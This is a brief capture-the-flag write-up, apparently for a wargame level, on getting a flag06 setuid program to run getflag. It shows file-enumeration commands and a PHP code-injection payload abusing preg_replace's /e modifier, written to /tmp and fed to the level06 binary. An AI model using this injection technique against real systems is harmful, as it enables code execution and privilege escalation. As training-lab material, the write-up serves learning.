## Project README: Finding flag06

Our routine: 
```bash
ls -la
find / -user flag06 -print 2>/dev/null
```
This time, there were two files.

So the idea is to make this file run getflag cause in doing so we are not running getflag as user **level06** but as **flag06** since level06 file was created by **flag06**.

To do so, we find that char **/e** was a wellknowned exploit for the **preg_replace** function.
After several aptement, we find out there was a **Regex** in the **php** program...
In order to exploit this breach, we used the following command: 

```bash
echo '/([x .{${system(getflag)}}@])' > /tmp/testphp
./level06 /tmp/testphp
```

And VOILA

